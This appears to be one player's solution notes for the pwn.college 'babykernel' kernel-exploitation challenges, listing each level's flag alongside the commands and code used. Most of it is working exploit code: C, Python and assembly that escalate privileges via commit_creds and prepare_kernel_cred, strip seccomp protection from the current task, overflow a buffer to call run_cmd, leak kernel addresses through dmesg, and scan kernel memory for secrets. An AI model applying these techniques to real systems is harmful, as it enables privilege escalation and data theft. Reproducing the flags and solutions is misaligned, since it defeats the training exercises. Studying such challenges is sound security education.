1.0. pwn.college{MjYxA_0IsVt5JzaJrww3soOIF5a.QXzIDNsITNxUzW}

vm start 
vm connect 
echo kuiurwwyyefgwkuu | cat /proc/pwncollege -> get password from ida 

1.1. pwn.college{IBj6yAm9oaKAc7eNApxar69D9Wi.QX0IDNsITNxUzW}

vm start 
vm connect 
vim pwncollege then ^C and it will print the flag 


2.0. pwn.college{YJQC3XRRSNftA30u1fWv3Hesc8V.QX1IDNsITNxUzW}

in userspace:
gcc k.c -static -o out
vm logs 
c program:
int main(){
    int size = write(open("/proc/pwncollege", O_RDWR), "mzbnjtnvnovwvkmi", 16);
}

in kernelspace:
vm start
vm connect 
./out

2.1. pwn.college{sar-V5vYrliNy5-rZKhlzFXooqo.QX2IDNsITNxUzW}

same as above with different password

3.0. pwn.college{wSWy5jtHjqbWK3Q2GdpLnx2W8rR.QX3IDNsITNxUzW}

everything same as above

c program:

int main(){
    write(open("/proc/pwncollege", O_RDWR), "gqppukadjspmlqzq", 16);
    sendfile(1, open("/flag", 0), 0, 1000);
}

3.1. pwn.college{YOdzv5a1h5L1L6fRHDWUAFaVCdd.QX4IDNsITNxUzW}

same as above, change password obvi 

4.0. pwn.college{8Nw_qv6B1KuUN3SW4gksC8j8CFT.QX5IDNsITNxUzW}

same as above

c program:

int main(){
    ioctl(open("/proc/pwncollege", O_RDWR), 1337, "pqfuffyvbcgbwbor");
    sendfile(1, open("/flag", 0), 0, 1000);
}

4.1. pwn.college{sxMZfOQgVLBBCh5e4gkqiethU7c.QXwMDNsITNxUzW}

same as above with changed password

5.0. pwn.college{Y-2gVBE9r7jDZ7UlaPtVpnx1x-g.QXxMDNsITNxUzW}

1. go to practice and run sudo tail /proc/kallsyms to ge the address of the win function
2. run the c code as above levels using the address you found above 

int main(){
    ioctl(open("/proc/pwncollege", O_RDWR), 1337, (void *) 0xffffffffc00006dd);
    sendfile(1, open("/flag", 0), 0, 1000);
}

5.1. pwn.college{Q-MqaTBi-3MYHHVqvCqrt46Rqeq.QXyMDNsITNxUzW}

same as above 

6.0. pwn.college{MpXa4VGsqM3c6pMIDJEAnG9J90d.QXzMDNsITNxUzW}

1. go to practice and find addresses of commit_creds and prepare_kernel_cred
2. run python code 

assembly ="""
.global _start
.intel_syntax noprefix
_start:

mov rdi, 0
mov rax, 0xffffffff810890d0
call rax

mov rdi, rax 
mov rax, 0xffffffff81088d90
call rax

ret
"""

os.write(os.open("/proc/pwncollege", os.O_RDWR), asm(assembly))
os.sendfile(1, os.open("/flag", 0), 0, 1000)

6.1. pwn.college{cEW4oc-vOdosqQ5qQq2wpqLFyt9.QX0MDNsITNxUzW}

same as above 

7.0. pwn.college{8lZ5phiGkibXBb21pPmwtl-M193.QX1MDNsITNxUzW}

1. finds addr for commit_creds and prepare_kernel_cred like above 
2. find the address of the shellcode on the heap
3. this can be done by breaking at device_ioctl (find using kallsyms)
4. then just keep doing si until you reach the third copy_from_user and get the address of $rdi, in my case it is 
                        (gdb) x/gx $rdi
                        0xffffc90000085000:     0x4800000000c7c748

c code: 

struct pwndata_t
{
  unsigned long size;
  unsigned char shellcode[4096];
  void (*function)(void);
};

int main(int argc, char **argv){
    struct pwndata_t *shell_code = (struct pwndata_t *)malloc(sizeof(struct pwndata_t *)); 
    shell_code->size = read(0, shell_code->shellcode, 4096);
    shell_code->function = (void*) 0xffffc90000085000;
    ioctl(open("/proc/pwncollege", O_RDWR), 1337, shell_code[0]);
    sendfile(1, open("/flag", 0), 0, 1000);
}

7.1. pwn.college{0vybVKywDOkNjzQLZ7vrhA37zkc.QX2MDNsITNxUzW}

same exact thing as above 


8.0. pwn.college{MNrWsVE8NIUivnNpRLxeb2RgE-A.QX3MDNsITNxUzW}

vm start 
vm connect
/challenge/babykernel_level8.0 < e.bin

shellcode: 

.global _start
.intel_syntax noprefix
_start:
    mov rax, 1
    lea rsi, [rip+kernel_shellcode]
    mov rdi, 3
    mov rdx, 18
    syscall

    mov rax, 2
    lea rdi, [rip+flag]
    mov rsi, 0
    syscall 

    mov rdi, 1
    mov rsi, rax 
    mov rdx, 0
    mov r10, 1000
    mov rax, 40
    syscall 

    ret

kernel_shellcode:
    mov rbx, qword ptr gs:0x15d00
    and qword ptr [rbx], 0xfffffffffffffeff
    ret

flag: 
    .string "/flag"

8.1. pwn.college{MXYKtf1zbFT0mId8Ci1uZN9TFrc.QX4MDNsITNxUzW}

same as above

9.0. pwn.college{4VKF_MCtMCFE0WbJmGvSdCtpo8o.QX5MDNsITNxUzW}

1. run python code then look at the file "pwncollege" to get the flag

python code:
# the address is "run_cmd" in using /proc/kallsyms
os.write(os.open("/proc/pwncollege", os.O_RDWR), b'/home/hacker/out\0'+ b'a'*239 + b'\x80\x95\x08\x81\xff\xff\xff\xff')

c code:
int main(int argc, char **argv){
    int fd = open("/home/hacker/pwncollege", O_RDWR | O_CREAT);
    sendfile(fd, open("/flag", 0), 0, 1000);
}

9.1. pwn.college{8At01tgPgVzc2zdjNDSIUuHfn89.QXwQDNsITNxUzW}

same as above


10.0. pwn.college{QA-25u6Dp7np_Xw7o0EXic1Peji.QXxQDNsITNxUzW}

1. run python code: os.write(os.open("/proc/pwncollege", os.O_RDWR), b"a" * 256)
2. look in dmesg for the address 
3. subtract 183712 from address 
4. this is the address of run_cmd
5. run same code as 9.0 with correct run_cmd address


10.1. pwn.college{w6DIxM5FfS_qhQRliC5HG-TyXQW.QXyQDNsITNxUzW}

same thing as above


11.0. pwn.college{cwOJ9NkIecRH7nNRAh_mNbYhjVL.QXzQDNsITNxUzW}

1. run this python code:

with process(["/challenge/babykernel_level11.0"]) as p:
    print(f"parent pid={p.pid}")
    print(f"children={proc.descendants(p.pid)}")
    assembly = f"""
    .global _start
    .intel_syntax noprefix
    _start:
        mov rax, 1
        lea rsi, [rip+kernel_shellcode]
        mov rdi, 3
        mov rdx, 18
        syscall


        mov rax, 2
        lea rdi, [rip+mem]
        mov rsi, 0
        syscall

        mov rcx, rax


        mov rdi, 4
        mov rax, 8
        mov rsi, 0x00404120
        mov rdx, 0
        syscall


        mov rdi, 4
        mov rax, 0
        mov rsi, rsp 
        mov rdx, 0x100
        syscall 


        mov rdx, 0x100
        mov rdi, 1
        mov rsi, rsp
        mov rax, 1
        syscall

        mov rax, 60
        syscall

        ret

    kernel_shellcode:
        mov rbx, qword ptr gs:0x15d00
        and qword ptr [rbx], 0xfffffffffffffeff
        ret

    mem:
        .string "/proc/{p.pid+1}/mem"
    
    """
    info(p.readrepeat(1))
    p.send(asm(assembly))
    info(p.readrepeat(1))

11.1. pwn.college{gZT5sjV4lPGBO7mvljSNJTUU4lJ.QX0QDNsITNxUzW}

same as above


12.0. pwn.college{wyyRwJDwMyb_7JQh3Ohyd7cMj7T.QX1QDNsITNxUzW}

terminal 1: vm start; vm connect
terminal 2: vm logs | grep pwn
terminal 1: /challenge/babykernel_level12.0 < e.bin 

e.bin:
.global _start
.intel_syntax noprefix
_start: 
    mov rax, 1
    lea rsi, [rip+kernel_shellcode]
    mov rdi, 3
    mov rdx, 0x100
    syscall

    ret

kernel_shellcode:
    mov r15, 0xffff888000000000

jump:
    xor rdi, rdi
    mov dil, byte ptr [rip+check] 
    xor r14, r14
    mov r14b, byte ptr [r15]
    cmp rdi, r14
    jne fail

    xor rdi, rdi
    mov dil, byte ptr [rip+check2] 
    xor r14, r14
    mov r14b, byte ptr [r15+11]
    cmp rdi, r14
    jne fail

    lea rsi, [r15]
    lea rdi, [rip+printk]
    mov rbx, 0xffffffff810b6309
    call rbx
fail:
    add r15, 8
    jmp jump

    ret
check:
    .string "pwn.coll"

check2:
    .string "{"

printk:
    .string "ptr=%s"
    


12.1. pwn.college{0gPVRoqv14nixSVMULaxElYCkFA.QX2QDNsITNxUzW}

same as above














